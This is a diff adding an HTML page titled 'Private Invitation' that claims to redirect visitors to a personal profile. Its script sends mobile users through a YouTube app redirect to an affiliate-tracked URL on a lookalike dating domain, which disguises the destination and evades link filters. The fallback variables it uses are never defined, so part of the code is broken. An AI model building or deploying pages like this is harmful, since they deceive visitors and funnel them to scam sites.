@@ -1,0 +1,41 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="https://drive.google.com/uc?id=19zF7Lp7MqgDrp9r0G7yZ6aZnGZ6KDHVj">
+<link rel="icon" href="https://get.cloudradar.net/img/favicon.ico" />
+<link rel="apple-touch-icon" href="https://get.cloudradar.net/img/love.png" />
+<title>Private Invitation</title>
+
+</head>
+
+<body>
+  <p id="countdown">You will be automatically redirected to my profile</p>
+  
+  <script>
+    var app = "vnd.youtube://youtube.com/redirect?event=comments&redir_token=QUFFLUhqbTFfOFJVUldiNjlSSDFrcGhvN192U1VGMjl2d3xBQ3Jtc0tra3g5WUxEVk52Nk1fRnV0MHZBcnpqRVB4RUJnTVRaVFRlWEdZTzR4U2IwdVhnOU1ZNmdSVEhkMDhNQV9UdHNjMGR2NE9KZUNkX0FoSHRyOTk4aG5sU3NSR0pHZGhRRGZNdXowVmpnRTZTM3U3cWQ3bw&q=https%3A%2F%2Fmwwejq.remarkabiedates.com%2F%3Futm_source%3Dda57dc555e50572d%26s1%3D181686%26s2%3D1930577%26click_id%3DSOMRAT%26j1%3D1&html_redirect=1";
+
+    document.addEventListener('DOMContentLoaded', function() {
+      setTimeout(function() {
+
+        if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+          window.location.href = app;
+          window.setTimeout(function() {
+            window.location.href = mobileFallback;
+          }, 25);
+        } else {
+          window.location.href = desktopFallback;
+        }
+
+        function killPopup() {
+          window.removeEventListener('pagehide', killPopup);
+        }
+
+        window.addEventListener('pagehide', killPopup);
+      }, 10);
+    });
+  </script>
+
+</body>
+</html>
